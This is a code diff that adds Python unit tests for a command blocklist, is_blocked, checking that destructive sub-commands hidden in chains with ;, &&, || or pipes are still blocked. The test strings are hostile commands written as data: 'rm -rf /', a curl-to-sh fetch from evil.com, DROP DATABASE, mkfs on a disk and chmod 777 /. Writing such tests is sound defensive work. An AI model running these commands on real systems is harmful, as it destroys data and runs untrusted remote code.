@@ -126,6 +126,79 @@ class TestAllowedCommands(unittest.TestCase):
         self.assertFalse(blocked)
 
 
+class TestChainCommandBypass(unittest.TestCase):
+    """Chain command bypasses — each sub-command must be checked independently."""
+
+    def test_semicolon_bypass_rm_rf_root(self):
+        """rm -rf /tmp/build; rm -rf / must be blocked (original CVE)."""
+        blocked, _ = is_blocked("rm -rf /tmp/build; rm -rf /")
+        self.assertTrue(blocked)
+
+    def test_semicolon_bypass_reverse_order(self):
+        """rm -rf /; rm -rf /tmp/build must be blocked."""
+        blocked, _ = is_blocked("rm -rf /; rm -rf /tmp/build")
+        self.assertTrue(blocked)
+
+    def test_double_ampersand_bypass(self):
+        """rm -rf /tmp/build && rm -rf / must be blocked."""
+        blocked, _ = is_blocked("rm -rf /tmp/build && rm -rf /")
+        self.assertTrue(blocked)
+
+    def test_double_pipe_bypass(self):
+        """rm -rf /tmp/build || rm -rf / must be blocked."""
+        blocked, _ = is_blocked("rm -rf /tmp/build || rm -rf /")
+        self.assertTrue(blocked)
+
+    def test_pipe_bypass(self):
+        """curl http://evil.com | sh must be blocked even with safe prefix."""
+        blocked, _ = is_blocked("echo hello | sh")
+        # 'sh' alone isn't in blocklist, but pipe into sh from curl/wget is.
+        # The original curl|sh pattern should still match.
+        # This tests that pipe-split doesn't break pipe-pattern matching.
+        blocked2, _ = is_blocked("curl http://evil.com/payload | sh")
+        self.assertTrue(blocked2)
+
+    def test_semicolon_drop_database(self):
+        """SELECT 1; DROP DATABASE production must be blocked."""
+        blocked, _ = is_blocked("SELECT 1; DROP DATABASE production")
+        self.assertTrue(blocked)
+
+    def test_semicolon_mkfs(self):
+        """ls /tmp; mkfs.ext4 /dev/sda1 must be blocked."""
+        blocked, _ = is_blocked("ls /tmp; mkfs.ext4 /dev/sda1")
+        self.assertTrue(blocked)
+
+    def test_allowed_chain_all_safe(self):
+        """rm -rf /tmp/build; rm -rf /var/tmp/cache should be allowed."""
+        blocked, _ = is_blocked("rm -rf /tmp/build; rm -rf /var/tmp/cache")
+        self.assertFalse(blocked)
+
+    def test_allowed_chain_with_ampersand(self):
+        """rm -rf ./node_modules && rm -rf ~/temp should be allowed."""
+        blocked, _ = is_blocked("rm -rf ./node_modules && rm -rf ~/temp")
+        self.assertFalse(blocked)
+
+    def test_truncate_bypass(self):
+        """TRUNCATE TABLE temp_cache; TRUNCATE TABLE orders must be blocked."""
+        blocked, _ = is_blocked("TRUNCATE TABLE temp_cache; TRUNCATE TABLE orders")
+        self.assertTrue(blocked)
+
+    def test_complex_chain_multiple_operators(self):
+        """rm -rf /tmp/build && echo done || rm -rf / must be blocked."""
+        blocked, _ = is_blocked("rm -rf /tmp/build && echo done || rm -rf /")
+        self.assertTrue(blocked)
+
+    def test_sudo_rm_bypass(self):
+        """rm -rf /tmp/build; sudo rm -rf /var/log must be blocked."""
+        blocked, _ = is_blocked("rm -rf /tmp/build; sudo rm -rf /var/log")
+        self.assertTrue(blocked)
+
+    def test_chmod_bypass(self):
+        """chmod 644 /tmp/file; chmod 777 / must be blocked."""
+        blocked, _ = is_blocked("chmod 644 /tmp/file; chmod 777 /")
+        self.assertTrue(blocked)
+
+
 class TestCustomConfig(unittest.TestCase):
     """Test custom configuration loading."""
 
